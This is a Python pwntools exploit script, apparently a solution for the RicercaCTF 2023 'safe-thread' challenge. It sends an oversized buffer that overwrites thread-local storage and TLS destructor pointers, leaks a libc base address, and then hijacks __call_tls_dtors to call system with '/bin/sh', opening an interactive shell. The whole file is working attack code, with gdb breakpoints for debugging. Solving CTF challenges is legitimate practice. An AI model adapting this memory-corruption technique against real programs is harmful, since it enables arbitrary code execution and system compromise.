
from itertools import product
from z3 import *
from pwn import *
import sys

elf = ELF("chall")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

io = process(elf.path)
# io = remote("safe-thread.2023.ricercactf.com", 9004)

context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
gdb.attach(io, gdb_args = ["-ex", "init-pwndbg"], gdbscript = ''' 
    b *main+59
    b *main+73
    thread 2
    b *__call_tls_dtors
    ''')

th_oft = 0x830
tls_dtor_oft = th_oft - 0x58

p = b'\x00' * tls_dtor_oft
p += p64(0x404005)
p = p.ljust(th_oft, b'\x00')
p += p64(0) # th
p += p64(0)
p += p64(elf.bss() + 0x100)
p += p64(0)
p += p64(0)
p += p64(0)
p += p64(0x4012c3)
p = p.ljust(0xa00, b'\x00')

io.sendlineafter(b'size: ', str(len(p) + 1).encode())
io.sendlineafter(b'data: ', p)

r = io.recv(6) + b'\x00\x00'
libc.address = u64(r) - 0x21af00 
print(f'libc addr: {hex(libc.address)}')

th_oft = 0x8c8
tls_dtor_oft = th_oft - 0x58

p = b'\x00' * tls_dtor_oft
p += p64(elf.sym["th"] - 8)
p = p.ljust(th_oft, b'\x00')
p += b'/bin/sh\x00' # th
p += p64(0)
p += p64(elf.bss() + 0x100)
p += p64(0)
p += p64(0)
p += p64(0)
p += p64(libc.sym["system"] + 27) # call do_system

print(hex(len(p)))
io.sendline(p)


io.interactive()
